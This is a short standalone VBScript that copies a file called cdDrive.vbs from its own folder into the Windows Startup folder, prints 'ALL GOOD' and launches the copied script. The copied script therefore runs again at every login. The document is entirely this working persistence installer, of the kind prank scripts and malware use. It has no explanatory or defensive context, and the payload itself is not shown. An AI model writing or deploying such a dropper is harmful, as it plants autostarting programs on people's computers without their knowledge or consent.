Dim WshShell
Dim myDir
Dim StartUp
Dim fso

Set WshShell = WScript.CreateObject("WScript.Shell")
 myDir = WshShell.CurrentDirectory

Set fso = CreateObject("Scripting.FileSystemObject")

StartUp = WshShell.SpecialFolders.Item("Startup")


If (fso.FolderExists(StartUp)) Then
    fso.CopyFile myDir &"\cdDrive.vbs",StartUp & "\"
	StartUp = StartUp +"\cdDrive.vbs"
	wscript.echo StartUp + "  ALL GOOD"
	WshShell.Run(StartUp)
	
End If




